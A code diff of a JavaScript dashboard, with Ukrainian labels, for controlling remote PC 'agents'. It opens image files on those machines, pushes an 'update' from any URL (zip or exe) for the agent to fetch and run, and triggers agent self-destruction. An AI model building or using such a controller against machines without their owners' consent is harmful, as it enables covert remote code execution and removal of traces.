@@ -1,91 +1,76 @@
-async function loadPCs(){
-  const res = await fetch('/api/pcs');
-  const pcs = await res.json();
-  const container = document.getElementById('pcs');
-  container.innerHTML = '';
-  const tpl = document.getElementById('card-template');
-  pcs.forEach(p=>{
+const pcsEl = document.getElementById('pcs');
+const tpl = document.getElementById('card');
+
+function renderAgents(list){
+  pcsEl.innerHTML = '';
+  (list||[]).forEach(a=>{
     const node = tpl.content.cloneNode(true);
-    node.querySelector('.pc-name').textContent = p.name;
-    node.querySelector('.pc-status').textContent = p.status === 'on' ? 'Увімкнений' : (p.status === 'offline' ? 'Офлайн' : 'Невідомо');
-    const openPanelBtn = node.querySelector('.open-panel');
-    const panel = node.querySelector('.panel');
-    const showImgBtn = node.querySelector('.show-image');
-    const panelResult = node.querySelector('.panel-result');
-    const select = node.querySelector('.file-select');
-    const selfdestructBtn = node.querySelector('.selfdestruct.single');
-
-    openPanelBtn.addEventListener('click', ()=> {
-      panel.classList.toggle('hidden');
-      // populate files list
-      select.innerHTML = '';
-      (p.files || []).forEach(f=>{
-        const opt = document.createElement('option');
-        opt.value = f;
-        opt.textContent = f;
-        select.appendChild(opt);
-      });
-      if((p.files || []).length === 0){
-        const opt = document.createElement('option');
-        opt.textContent = 'Файлів не знайдено';
-        select.appendChild(opt);
-      }
+    const el = node.querySelector('.card');
+    el.querySelector('.name').textContent = a.name || a.id;
+    el.querySelector('.status').textContent = a.online ? 'Увімкнений' : 'Офлайн';
+    const sel = el.querySelector('.files');
+    sel.innerHTML = '';
+    (a.files||[]).forEach(f=>{
+      const o = document.createElement('option');
+      o.value = f; o.textContent = f; sel.appendChild(o);
     });
-
-    showImgBtn.addEventListener('click', async ()=>{
-      panelResult.textContent = 'Виконую...';
+    if((a.files||[]).length===0){
+      const o = document.createElement('option'); o.textContent = 'Файлів немає'; sel.appendChild(o);
+    }
+    const msg = el.querySelector('.msg');
+    el.querySelector('.open').addEventListener('click', async ()=>{
+      msg.textContent = 'Виконую...';
       try{
-        const r = await fetch('/api/open', {
-          method:'POST',
-          headers:{'Content-Type':'application/json'},
-          body: JSON.stringify({ host: p.host, file: select.value })
+        const file = sel.value;
+        const r = await fetch(`/api/agents/${encodeURIComponent(a.id)}/open`, {
+          method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ file })
         });
-        const data = await r.json();
-        if(r.ok && data.ok){
-          panelResult.textContent = 'Команда відправлена — картинка повинна відкритися на ПК.';
-        }else{
-          panelResult.textContent = 'Помилка: ' + (data.error || JSON.stringify(data));
-        }
-      }catch(e){
-        panelResult.textContent = 'Помилка мережі: ' + e.message;
-      }
+        const j = await r.json();
+        if(r.ok && j.ok) msg.textContent = 'Команда відправлена';
+        else msg.textContent = 'Помилка: ' + (j.error || JSON.stringify(j));
+      }catch(e){ msg.textContent = 'Помилка мережі: ' + e.message; }
     });
-
-    selfdestructBtn.addEventListener('click', async ()=>{
-      if(!confirm('Ви впевнені? Ця дія видалить агента з цього ПК та його файли. Відновити буде неможливо.')) return;
-      panelResult.textContent = 'Надсилаю команду самознищення...';
+    el.querySelector('.update').addEventListener('click', async ()=>{
+      const url = prompt('Вкажіть URL для апдейту (zip або exe):');
+      if(!url) return;
+      msg.textContent = 'Надсилаю апдейт...';
       try{
-        const r = await fetch('/api/selfdestruct', {
-          method:'POST',
-          headers:{'Content-Type':'application/json'},
-          body: JSON.stringify({ host: p.host })
+        const r = await fetch(`/api/agents/${encodeURIComponent(a.id)}/update`, {
+          method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ url })
         });
-        const data = await r.json();
-        if(r.ok && data.ok){
-          panelResult.textContent = 'Агент почав процес самознищення.';
-        }else{
-          panelResult.textContent = 'Помилка: ' + (data.error || JSON.stringify(data));
-        }
-      }catch(e){
-        panelResult.textContent = 'Помилка мережі: ' + e.message;
-      }
+        const j = await r.json();
+        msg.textContent = (j.ok ? 'АПДЕЙТ ініційовано' : ('Помилка: '+(j.error||JSON.stringify(j))));
+      }catch(e){ msg.textContent = 'Помилка мережі: ' + e.message; }
+    });
+    el.querySelector('.self').addEventListener('click', async ()=>{
+      if(!confirm('Ви впевнені? Агент видалить себе і картинки.')) return;
+      msg.textContent = 'Надсилаю команду самознищення...';
+      try{
+        const r = await fetch(`/api/agents/${encodeURIComponent(a.id)}/selfdestruct`, { method:'POST' });
+        const j = await r.json();
+        msg.textContent = (j.ok ? 'Самознищення ініційоване' : ('Помилка: '+(j.error||JSON.stringify(j))));
+      }catch(e){ msg.textContent = 'Помилка мережі: ' + e.message; }
     });
 
-    container.appendChild(node);
+    pcsEl.appendChild(node);
   });
 }
 
-document.getElementById('selfdestructAll').addEventListener('click', async ()=>{
-  if(!confirm('Ви впевнені? Це запустить самознищення на ВСІХ агентах зі списку pcs.json.')) return;
+// SSE connection
+const evt = new EventSource('/events');
+evt.addEventListener('agents', e=>{
   try{
-    const r = await fetch('/api/selfdestruct-all', { method:'POST' });
-    const res = await r.json();
-    alert('Команди надіслані. Перевірте результати у консолі сервера або через статус агента.');
-    loadPCs();
-  }catch(e){
-    alert('Помилка: ' + e.message);
-  }
+    const data = JSON.parse(e.data);
+    // server provides array
+    const list = data.map(a=>{
+      const online = (Date.now() - (a.lastSeen || 0)) < 90_000;
+      return { id: a.id, name: a.name, files: a.files || [], lastSeen: a.lastSeen, online };
+    });
+    renderAgents(list);
+  }catch(e){}
 });
-
-loadPCs();
-setInterval(loadPCs, 8000);
+evt.onerror = (err)=> {
+  console.warn('SSE error', err);
+  // fallback to polling
+  fetch('/api/agents').then(r=>r.json()).then(renderAgents).catch(()=>{});
+};
